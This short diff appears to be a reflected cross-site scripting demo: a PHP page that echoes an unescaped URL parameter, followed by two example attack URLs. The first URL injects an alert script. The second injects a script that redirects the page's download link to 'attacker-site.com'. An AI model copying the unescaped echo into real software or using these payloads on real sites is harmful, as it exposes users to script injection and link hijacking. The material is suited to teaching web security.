@@ -1,0 +1,16 @@
+<?php
+$name = $_GET['name'];
+echo "Welcome $name<br>";
+echo '<a href="http://www.cnblogs.com/bangerlee/">Click to Download</a>';
+?>
+index.php?name=guest<script>alert('attacked')</script>
+
+index.php?name=
+<script>
+window.onload = function(){
+var
+	link = document.getElementsByTagName("a");link[0].href="http://attacker-site.com/";
+	}
+	</script>
+
+
